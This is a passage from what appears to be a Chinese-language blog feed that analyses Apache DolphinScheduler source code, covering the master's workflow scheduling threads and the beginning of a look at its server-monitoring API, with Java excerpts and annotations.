false)</span> TaskDependType taskDependType,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;execType&quot;, required = false)</span> CommandType execType,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;warningType&quot;)</span> WarningType warningType,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;warningGroupId&quot;, required = false, defaultValue = &quot;0&quot;)</span> Integer warningGroupId,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;runMode&quot;, required = false)</span> RunMode runMode,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;processInstancePriority&quot;, required = false)</span> Priority processInstancePriority,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;workerGroup&quot;, required = false, defaultValue = &quot;default&quot;)</span> String workerGroup,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;environmentCode&quot;, required = false, defaultValue = &quot;-1&quot;)</span> Long environmentCode,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;timeout&quot;, required = false)</span> Integer timeout,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;startParams&quot;, required = false)</span> String startParams,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;expectedParallelismNumber&quot;, required = false)</span> Integer expectedParallelismNumber,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;dryRun&quot;, defaultValue = &quot;0&quot;, required = false)</span> <span class="type">int</span> dryRun,</span></span><br><span class="line"><span class="params">                                   <span class="meta">@RequestParam(value = &quot;complementDependentMode&quot;, required = false)</span> ComplementDependentMode complementDependentMode)</span> &#123;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (timeout == <span class="literal">null</span>) &#123;</span><br><span class="line">        timeout = Constants.MAX_TASK_TIMEOUT;</span><br><span class="line">    &#125;</span><br><span class="line">    Map&lt;String, String&gt; startParamMap = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (startParams != <span class="literal">null</span>) &#123;</span><br><span class="line">        startParamMap = JSONUtils.toMap(startParams);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (complementDependentMode == <span class="literal">null</span>) &#123;</span><br><span class="line">        complementDependentMode = ComplementDependentMode.OFF_MODE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//生成commnd信息入库</span></span><br><span class="line">    Map&lt;String, Object&gt; result = execService.execProcessInstance(loginUser, projectCode, processDefinitionCode,</span><br><span class="line">            scheduleTime, execType, failureStrategy,</span><br><span class="line">            startNodeList, taskDependType, warningType, warningGroupId, runMode, processInstancePriority,</span><br><span class="line">            workerGroup, environmentCode, timeout, startParamMap, expectedParallelismNumber, dryRun, complementDependentMode);</span><br><span class="line">    <span class="keyword">return</span> returnDataList(result);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.2 master 调度任务</p><p>3.2.1  master启动</p><p>DS</p><p>MasterServer.run() 方法</p><p>启动 master 的工作线程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> <span class="keyword">throws</span> SchedulerException &#123;</span><br><span class="line"><span class="comment">// init rpc server</span></span><br><span class="line"><span class="built_in">this</span>.masterRPCServer.start();<span class="comment">//启动netty rpc服务，与worker通信使用</span></span><br><span class="line"><span class="comment">// install task plugin</span></span><br><span class="line"><span class="built_in">this</span>.taskPluginManager.loadPlugin();<span class="comment">//加载taskplugin</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// self tolerant</span></span><br><span class="line"><span class="built_in">this</span>.masterRegistryClient.init();<span class="comment">//加载高可用的一些注册信息</span></span><br><span class="line"><span class="built_in">this</span>.masterRegistryClient.start();</span><br><span class="line"><span class="built_in">this</span>.masterRegistryClient.setRegistryStoppable(<span class="built_in">this</span>);</span><br><span class="line"><span class="comment">//command扫描线程</span></span><br><span class="line"><span class="built_in">this</span>.masterSchedulerBootstrap.init();</span><br><span class="line"><span class="built_in">this</span>.masterSchedulerBootstrap.start();</span><br><span class="line"><span class="comment">//事件处理线程</span></span><br><span class="line"><span class="built_in">this</span>.eventExecuteService.start();</span><br><span class="line"><span class="built_in">this</span>.failoverExecuteThread.start();</span><br><span class="line"><span class="comment">//定时调度</span></span><br><span class="line"><span class="built_in">this</span>.schedulerApi.start();</span><br><span class="line"></span><br><span class="line">Runtime.getRuntime().addShutdownHook(<span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (Stopper.isRunning()) &#123;</span><br><span class="line">        close(<span class="string">&quot;MasterServer shutdownHook&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3.2.2 command扫描</p><p>DS</p><p>MasterSchedulerBootstrap.run()方法</p><p>该线程在3.2.1启动，启动之后，进入循环，一直扫描 command 表，查询出 command，然后封装成 processInstants 入库，创建 WorkflowExecuteRunnable (此对象后续很多地方用到) 写入到 workflowEventQueue 中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">while</span> (Stopper.isRunning()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// todo: if the workflow event queue is much, we need to handle the back pressure</span></span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isOverload</span> <span class="operator">=</span></span><br><span class="line">                    OSUtils.isOverload(masterConfig.getMaxCpuLoadAvg(), masterConfig.getReservedMemory());</span><br><span class="line">            <span class="keyword">if</span> (isOverload) &#123;</span><br><span class="line">                MasterServerMetrics.incMasterOverload();</span><br><span class="line">                Thread.sleep(Constants.SLEEP_TIME_MILLIS);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            List&lt;Command&gt; commands = findCommands();</span><br><span class="line">            <span class="keyword">if</span> (CollectionUtils.isEmpty(commands)) &#123;</span><br><span class="line">                <span class="comment">// indicate that no command ,sleep for 1s</span></span><br><span class="line">                Thread.sleep(Constants.SLEEP_TIME_MILLIS);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//将command转换成processInstance,并入库</span></span><br><span class="line">            List&lt;ProcessInstance&gt; processInstances = command2ProcessInstance(commands);</span><br><span class="line">            <span class="keyword">if</span> (CollectionUtils.isEmpty(processInstances)) &#123;</span><br><span class="line">                <span class="comment">// indicate that the command transform to processInstance error, sleep for 1s</span></span><br><span class="line">                Thread.sleep(Constants.SLEEP_TIME_MILLIS);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            MasterServerMetrics.incMasterConsumeCommand(commands.size());</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            processInstances.forEach(processInstance -&gt; &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    LoggerUtils.setWorkflowInstanceIdMDC(processInstance.getId());</span><br><span class="line">                    <span class="keyword">if</span> (processInstanceExecCacheManager.contains(processInstance.getId())) &#123;</span><br><span class="line">                        logger.error(<span class="string">&quot;The workflow instance is already been cached, this case shouldn&#x27;t be happened&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="type">WorkflowExecuteRunnable</span> <span class="variable">workflowRunnable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WorkflowExecuteRunnable</span>(processInstance,</span><br><span class="line">                            processService,</span><br><span class="line">                            nettyExecutorManager,</span><br><span class="line">                            processAlertManager,</span><br><span class="line">                            masterConfig,</span><br><span class="line">                            stateWheelExecuteThread,</span><br><span class="line">                            curingGlobalParamsService);</span><br><span class="line">                    processInstanceExecCacheManager.cache(processInstance.getId(), workflowRunnable);<span class="comment">//processInstanceExecCacheManager设置进cache 被  workflowEventLoop获取</span></span><br><span class="line">                    workflowEventQueue.addEvent(<span class="keyword">new</span> <span class="title class_">WorkflowEvent</span>(WorkflowEventType.START_WORKFLOW,</span><br><span class="line">                            processInstance.getId()));</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    LoggerUtils.removeWorkflowInstanceIdMDC();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException interruptedException) &#123;</span><br><span class="line">            logger.warn(<span class="string">&quot;Master schedule bootstrap interrupted, close the loop&quot;</span>, interruptedException);</span><br><span class="line">            Thread.currentThread().interrupt();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;Master schedule workflow error&quot;</span>, e);</span><br><span class="line">            <span class="comment">// sleep for 1s here to avoid the database down cause the exception boom</span></span><br><span class="line">            ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>}<br>3.2.3 workerFlowEvent消费</p><p>DS</p><p>在 command 扫描线程中启动了 workflowEventLooper 线程用于消费 workerFlowEvent 。</p><p>MasterSchedulerBootstrap.start() 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> &#123;</span><br><span class="line">    logger.info(<span class="string">&quot;Master schedule bootstrap starting..&quot;</span>);</span><br><span class="line">    <span class="built_in">super</span>.start();</span><br><span class="line">    workflowEventLooper.start();<span class="comment">//工作流调度线程启动</span></span><br><span class="line">    logger.info(<span class="string">&quot;Master schedule bootstrap started...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>从workflowEventQueue 拉取 workflowevent 事件，调用 workflowEventHandler 处理该事件。</p><p><strong>WorkflowEventLooper.run()方法</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">WorkflowEvent</span> <span class="variable">workflowEvent</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">while</span> (Stopper.isRunning()) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            workflowEvent = workflowEventQueue.poolEvent();<span class="comment">//拉取workflowevent</span></span><br><span class="line">            LoggerUtils.setWorkflowInstanceIdMDC(workflowEvent.getWorkflowInstanceId());</span><br><span class="line">            logger.info(<span class="string">&quot;Workflow event looper receive a workflow event: &#123;&#125;, will handle this&quot;</span>, workflowEvent);</span><br><span class="line">            <span class="type">WorkflowEventHandler</span> <span class="variable">workflowEventHandler</span> <span class="operator">=</span></span><br><span class="line">                workflowEventHandlerMap.get(workflowEvent.getWorkflowEventType());<span class="comment">//获取workflowevent，处理workflowevent事件</span></span><br><span class="line">            workflowEventHandler.handleWorkflowEvent(workflowEvent);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">            logger.warn(<span class="string">&quot;WorkflowEventLooper thread is interrupted, will close this loop&quot;</span>, e);</span><br><span class="line">            Thread.currentThread().interrupt();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (WorkflowEventHandleException workflowEventHandleException) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;Handle workflow event failed, will add this event to event queue again, event: &#123;&#125;&quot;</span>,</span><br><span class="line">                workflowEvent, workflowEventHandleException);</span><br><span class="line">            workflowEventQueue.addEvent(workflowEvent);</span><br><span class="line">            ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (WorkflowEventHandleError workflowEventHandleError) &#123;</span><br><span class="line">            logger.error(<span class="string">&quot;Handle workflow event error, will drop this event, event: &#123;&#125;&quot;</span>,</span><br><span class="line">                         workflowEvent,</span><br><span class="line">                         workflowEventHandleError);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception unknownException) &#123;</span><br><span class="line">            logger.error(</span><br><span class="line">                <span class="string">&quot;Handle workflow event failed, get a unknown exception, will add this event to event queue again, event: &#123;&#125;&quot;</span>,</span><br><span class="line">                workflowEvent, unknownException);</span><br><span class="line">            workflowEventQueue.addEvent(workflowEvent);</span><br><span class="line">            ThreadUtils.sleep(Constants.SLEEP_TIME_MILLIS);</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            LoggerUtils.removeWorkflowInstanceIdMDC();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3.2.4 workerflow事件处理逻辑</strong></p><p><strong>DS</strong></p><p>因为是START_WORKFLOW类型的所以获取到 WorkflowStartEventHandler.handleWorkflowEvent() 来处理该事件。</p><p>该方法中，获取 WorkflowExecuteRunnable ，运行异步任务调用 call 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">handleWorkflowEvent</span><span class="params">(WorkflowEvent workflowEvent)</span> <span class="keyword">throws</span> WorkflowEventHandleError &#123;</span><br><span class="line">    logger.info(<span class="string">&quot;Handle workflow start event, begin to start a workflow, event: &#123;&#125;&quot;</span>, workflowEvent);</span><br><span class="line"><span class="comment">//获取WorkflowExecuteRunnable </span></span><br><span class="line">    <span class="type">WorkflowExecuteRunnable</span> <span class="variable">workflowExecuteRunnable</span> <span class="operator">=</span></span><br><span class="line">       processInstanceExecCacheManager.getByProcessInstanceId(workflowEvent.getWorkflowInstanceId());</span><br><span class="line">    <span class="keyword">if</span> (workflowExecuteRunnable == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WorkflowEventHandleError</span>(</span><br><span class="line">            <span class="string">&quot;The workflow start event is invalid, cannot find the workflow instance from cache&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ProcessInstance</span> <span class="variable">processInstance</span> <span class="operator">=</span> workflowExecuteRunnable.getProcessInstance();</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    ProcessInstanceMetrics.incProcessInstanceSubmit();</span><br><span class="line">   <span class="comment">//异步调用call方法执行workflowExecute运行逻辑。</span></span><br><span class="line"> CompletableFuture&lt;WorkflowSubmitStatue&gt; workflowSubmitFuture =</span><br><span class="line">        CompletableFuture.supplyAsync(workflowExecuteRunnable::call, workflowExecuteThreadPool);</span><br><span class="line">    workflowSubmitFuture.thenAccept(workflowSubmitStatue -&gt; &#123;</span><br><span class="line">        <span class="keyword">if</span> (WorkflowSubmitStatue.SUCCESS == workflowSubmitStatue) &#123;</span><br><span class="line">            <span class="comment">// submit failed will resend the event to workflow event queue</span></span><br><span class="line">            logger.info(<span class="string">&quot;Success submit the workflow instance&quot;</span>);<span class="comment">//监听返回状态是否成功</span></span><br><span class="line">            <span class="keyword">if</span> (processInstance.getTimeout() &gt; <span class="number">0</span>) &#123;<span class="comment">//是否超时</span></span><br><span class="line">                stateWheelExecuteThread.addProcess4TimeoutCheck(processInstance);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;<span class="comment">//出现异常，重试，重新进入队列，调用call方法</span></span><br><span class="line">            logger.error(<span class="string">&quot;Failed to submit the workflow instance, will resend the workflow start event: &#123;&#125;&quot;</span>,</span><br><span class="line">                         workflowEvent);</span><br><span class="line">            workflowEventQueue.addEvent(<span class="keyword">new</span> <span class="title class_">WorkflowEvent</span>(WorkflowEventType.START_WORKFLOW,</span><br><span class="line">                                                          processInstance.getId()));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>3.2.5 workerflowRunnable运行逻辑</strong></p><p><strong>DS</strong></p><p><strong>WorkflowExecuteRunnable.call()</strong></p><ul><li>初始化workerflow的有向无环图。</li><li>初始化任务调度配置</li><li>提交源头任务到任务优先级队列中。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;&#92;assets&#92;css&#92;APlayer.min.css&quot;&gt;&lt;script src=&quot;&#92;assets&#92;js&#92;APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="技术" scheme="https://sfyyh.github.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="dolphinscheduler" scheme="https://sfyyh.github.io/tags/dolphinscheduler/"/>
    
    <category term="大数据分析平台" scheme="https://sfyyh.github.io/tags/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%B9%B3%E5%8F%B0/"/>
    
    <category term="GitHub" scheme="https://sfyyh.github.io/tags/GitHub/"/>
    
  </entry>
  
  <entry>
    <title>dolphinscheduler监控功能刨析</title>
    <link href="https://sfyyh.github.io/2023/07/18/dolphinscheduler%E7%9B%91%E6%8E%A7%E5%8A%9F%E8%83%BD%E5%88%A8%E6%9E%90/"/>
    <id>https://sfyyh.github.io/2023/07/18/dolphinscheduler%E7%9B%91%E6%8E%A7%E5%8A%9F%E8%83%BD%E5%88%A8%E6%9E%90/</id>
    <published>2023-07-18T01:43:54.000Z</published>
    <updated>2023-08-04T01:46:07.073Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="dolphinscheduler源码分析记录"><a href="#dolphinscheduler源码分析记录" class="headerlink" title="dolphinscheduler源码分析记录"></a>dolphinscheduler源码分析记录</h1><h1 id="Dolphinscheduler-api-1"><a href="#Dolphinscheduler-api-1" class="headerlink" title="Dolphinscheduler-api-1"></a>Dolphinscheduler-api-1</h1><h2 id="MonitorController-java部分"><a href="#MonitorController-java部分" class="headerlink" title="MonitorController.java部分"></a>MonitorController.java部分</h2><ul><li><input checked="" disabled="" type="checkbox"> 任务一：新增功能获取master&#x2F;work服务器CPU核心数目以及一共磁盘大小，</li><li><input disabled="" type="checkbox"> 任务二：分析如何向监控中心API中写入master&#x2F;work服务器CPU核心数目以及一共磁盘大小，</li></ul><p>核心代码部分:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * master list</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loginUser login user</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> master list</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@ApiOperation(value = &quot;listMaster&quot;, notes = &quot;MASTER_LIST_NOTES&quot;)</span></span><br><span class="line">    <span class="meta">@GetMapping(value = &quot;/masters&quot;)</span></span><br><span class="line">    <span class="meta">@ResponseStatus(HttpStatus.OK)</span></span><br><span class="line">    <span class="meta">@ApiException(LIST_MASTERS_ERROR)</span></span><br><span class="line">    <span class="meta">@AccessLogAnnotation(ignoreRequestArgs = &quot;loginUser&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Result <span class="title function_">listMaster</span><span class="params">(<span class="meta">@ApiIgnore</span> <span class="meta">@RequestAttribute(value = Constants.SESSION_USER)</span> User loginUser)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; result = monitorService.queryMaster(loginUser);</span><br><span class="line">        <span class="keyword">return</span> returnDataList(result);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>MonitorService.java接口功能核心部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Map&lt;String, Object&gt; <span class="title function_">queryMaster</span><span class="params">(User loginUser)</span>;</span><br></pre></td></tr></table></figure><p>MonitorServiceImpl.java接口实现类核心部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * query master list</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> loginUser login user</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> master information list</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Map&lt;String, Object&gt; <span class="title function_">queryMaster</span><span class="params">(User loginUser)</span> &#123;</span><br><span class="line">        Map&lt;String, Object&gt; result = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        List&lt;Server&gt; masterServers = getServerListFromRegistry(<span class="literal">true</span>);</span><br><span class="line">        result.put(Constants.DATA_LIST, masterServers);</span><br><span class="line">        putMsg(result, Status.SUCCESS);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>result.put(Constants.*DATA_LIST*, masterServers);</code> 语句中<code>Constants.*DATA_LIST*</code>  是前端json里的data数组部分，装入masterServers  </p><p><code>getServerListFromRegistry(true);</code>方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;Server&gt; <span class="title function_">getServerListFromRegistry</span><span class="params">(<span class="type">boolean</span> isMaster)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> isMaster</span><br><span class="line">            ? registryClient.getServerList(NodeType.MASTER)</span><br><span class="line">            : registryClient.getServerList(NodeType.WORKER);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p><code>registryClient.getServerList(NodeType.*MASTER*)</code> 获取master节点的服务信息列表</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List&lt;Server&gt; <span class="title function_">getServerList</span><span class="params">(NodeType nodeType)</span> &#123;</span><br><span class="line">        Map&lt;String, String&gt; serverMaps = getServerMaps(nodeType, <span class="literal">false</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">parentPath</span> <span class="operator">=</span> rootNodePath(nodeType);</span><br><span class="line"></span><br><span class="line">        List&lt;Server&gt; serverList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : serverMaps.entrySet()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">serverPath</span> <span class="operator">=</span> entry.getKey();</span><br><span class="line">            <span class="type">String</span> <span class="variable">heartBeatJson</span> <span class="operator">=</span> entry.getValue();</span><br><span class="line">            <span class="keyword">if</span> (StringUtils.isEmpty(heartBeatJson)) &#123;</span><br><span class="line">                logger.error(<span class="string">&quot;The heartBeatJson is empty, serverPath: &#123;&#125;&quot;</span>, serverPath);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Server</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Server</span>();</span><br><span class="line">            <span class="keyword">switch</span> (nodeType) &#123;</span><br><span class="line">                <span class="keyword">case</span> MASTER:</span><br><span class="line">                    <span class="type">MasterHeartBeat</span> <span class="variable">masterHeartBeat</span> <span class="operator">=</span> JSONUtils.parseObject(heartBeatJson, MasterHeartBeat.class);</span><br><span class="line">                    server.setCreateTime(<span class="keyword">new</span> <span class="title class_">Date</span>(masterHeartBeat.getStartupTime()));</span><br><span class="line">                    server.setLastHeartbeatTime(<span class="keyword">new</span> <span class="title class_">Date</span>(masterHeartBeat.getReportTime()));</span><br><span class="line">                    server.setId(masterHeartBeat.getProcessId());</span><br><span class="line">                    server.setCpuCoreCount(masterHeartBeat.getCpuCoreCount());<span 